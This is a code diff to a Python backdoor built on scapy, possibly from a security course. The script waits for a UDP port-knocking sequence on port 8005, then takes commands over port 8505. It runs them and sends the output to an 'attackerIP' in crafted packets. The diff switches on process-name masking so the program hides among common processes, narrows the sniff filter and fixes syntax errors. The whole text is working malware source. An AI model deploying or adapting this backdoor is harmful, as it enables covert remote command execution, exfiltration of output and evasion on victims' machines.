@@ -1,8 +1,8 @@
-#/usr/bin/python
+#/usr/bin/python3
 
 import socket, os, sys, time, logging
-import setproctitle
 from scapy.all import *
+import setproctitle
 import config
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
@@ -40,7 +40,7 @@ def executeCmd(packet, cmd):
     result = result.stdout.read() + result.stderr.read()
     packet = craftPacket(attackerIP, attackerPort, result)
     send(packet)
-    time.sleep(0.1s)
+    time.sleep(0.1)
 
 
 def parsePacket(packet):
@@ -70,12 +70,12 @@ def maskProcess():
     print("Most common process for ps command: {}".format(cmdResult))
 
 def main():
-    #maskProcess()
+    maskProcess()
     checkRootPrivilege()
     while code != 3:
         sniff(filter="udp and dst port 8005", prn=portKnocking, count=1)
     while True:
-        sniff(filter="dst port 8505", prn=parsePacket, count=1)
+        sniff(filter="tcp and dst port 8505", prn=parsePacket, count=1)
 
 
 if __name__ == '__main__':
